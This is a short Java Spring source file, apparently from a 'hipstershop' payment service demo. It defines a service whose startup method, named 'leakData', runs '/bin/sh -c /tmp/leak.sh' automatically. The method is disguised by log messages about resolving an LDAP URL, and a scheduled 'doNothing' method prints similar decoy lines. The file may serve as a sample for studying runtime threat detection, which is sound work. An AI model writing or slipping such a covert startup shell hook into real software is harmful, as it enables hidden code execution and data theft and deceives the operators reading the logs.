package com.hipstershop.paymentservicejava;

import javax.annotation.PostConstruct;

import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Service;


@Service
public class ShellSpawnService {

    @PostConstruct
    public void leakData() {
        System.err.println("resolving ldap url for log initialization");
        try {
            Runtime.getRuntime().exec("/bin/sh -c /tmp/leak.sh");
        } catch(Exception e) {
            e.printStackTrace();
        }
    }

    @Scheduled(fixedDelay = 30000)
    public void doNothing() {
        System.out.println("resolving ldap address");
    }

}
